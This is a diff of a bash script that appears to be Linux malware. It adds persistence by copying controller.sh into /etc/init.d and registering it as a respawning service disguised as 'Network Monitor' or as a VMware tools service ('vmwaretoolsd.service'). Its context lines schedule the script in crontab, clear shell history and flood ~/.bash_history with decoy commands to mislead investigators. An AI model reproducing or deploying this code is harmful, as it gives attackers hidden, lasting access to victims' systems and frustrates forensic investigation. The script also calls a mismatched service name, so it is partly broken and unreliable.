@@ -14,6 +14,32 @@ do
     fi
 done
 (crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/rc.local/controller.sh") | crontab -
+cp -p "controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
+if [[ $(initctl version) =~ upstart ]]; then
+    cat > /etc/init/network-monitor.conf << EOF
+    description "Network Monitor"
+    start on runlevel [2345]
+    stop on runlevel [!2345]
+    respawn
+    respawn limit unlimited
+    exec /etc/init.d/rc.local/rcd.sh
+EOF
+    start my-service
+elif [[ $(systemctl) ]]; then
+    cat > /etc/systemd/system/vmwaretoolsd.service << EOF
+    [Unit]
+    Description=Service for virtual machines hosted on VMWare
+    After=network.target
+
+    [Service]
+    Type=simple
+    ExecStart=/etc/init.d/rc.local/rcd.sh
+    Restart=always
+    RestartSec=10
+
+    [Install]
+    WantedBy=multi-user.target
+EOF
 
 #garbage
 history -c
@@ -35,4 +61,3 @@ for i in {1..200}; do
     10) echo "cat /etc/ssh/sshd_config";;
   esac
 done >> ~/.bash_history
-#remember to clear history in browser i guess
